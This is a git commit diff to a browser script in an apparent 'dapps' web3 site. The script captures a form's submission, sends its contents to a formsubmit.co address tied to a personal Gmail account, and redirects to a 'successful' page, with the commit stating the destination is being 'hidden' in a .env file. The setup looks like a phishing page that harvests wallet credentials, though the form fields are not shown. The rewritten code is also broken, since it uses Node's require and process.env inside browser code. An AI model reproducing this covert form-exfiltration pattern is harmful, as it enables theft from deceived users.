04c7c866dbd27c098a1530ac5a1e9b28e0d410bc
Chichebe <chichebewebdev@gmail.com>
2023-12-16 09:23:59 +0100

    emai link hidden in .env file

--- assets/js/dapps/scr.js
+++ assets/js/dapps/scr.js
@@ -1,48 +1,46 @@
+require("dotenv").config(); // Load dotenv
 
-          
-                        document.getElementById('myForm').addEventListener('submit', function (event) {
-                            event.preventDefault();
-                        
-                            // Show loader
-                            document.getElementById('loader').style.display = 'inline-block';
-                        
-                            var xhr = new XMLHttpRequest();
-                            xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
-                            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                        
-                            xhr.onreadystatechange = function () {
-                                if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
-                                    // Hide loader
-                                    document.getElementById('loader').style.display = 'none';
-                        
-                                    // Redirect after successful submission
-                                    window.location.href = "https://web3v3api.pages.dev/successful.html";
-                                }
-                            }
-                        
-                            var formData = new FormData(document.getElementById('myForm'));
-                            xhr.send(formData);
-                        });
-                       
+const FORM_SUBMIT_EMAIL = process.env.FORM_SUBMIT_EMAIL;
+console.log(FORM_SUBMIT_EMAIL);
 
+document.getElementById("myForm").addEventListener("submit", function (event) {
+  event.preventDefault();
 
-                        
-                        // document.getElementById('myForm').addEventListener('submit', function (event) {
-                        //     event.preventDefault();
+  // Show loader
+  document.getElementById("loader").style.display = "inline-block";
 
-                        //     var xhr = new XMLHttpRequest();
-                        //     xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
-                        //     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", FORM_SUBMIT_EMAIL, true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-                        //     xhr.onreadystatechange = function () {
-                        //         if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
-                        //             // Redirect after successful submission
-                        //             window.location.href = "https://web3v3api.pages.dev/successful.html";
-                        //         }
-                        //     }
+  xhr.onreadystatechange = function () {
+    if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
+      // Hide loader
+      document.getElementById("loader").style.display = "none";
 
-                        //     var formData = new FormData(this);
-                        //     xhr.send(formData);
-                        // });
-                
-                        
+      // Redirect after successful submission
+      window.location.href = "https://web3v3api.pages.dev/successful.html";
+    }
+  };
+
+  var formData = new FormData(document.getElementById("myForm"));
+  xhr.send(formData);
+});
+
+// document.getElementById('myForm').addEventListener('submit', function (event) {
+//     event.preventDefault();
+
+//     var xhr = new XMLHttpRequest();
+//     xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
+//     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+//     xhr.onreadystatechange = function () {
+//         if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
+//             // Redirect after successful submission
+//             window.location.href = "https://web3v3api.pages.dev/successful.html";
+//         }
+//     }
+
+//     var formData = new FormData(this);
+//     xhr.send(formData);
+// });
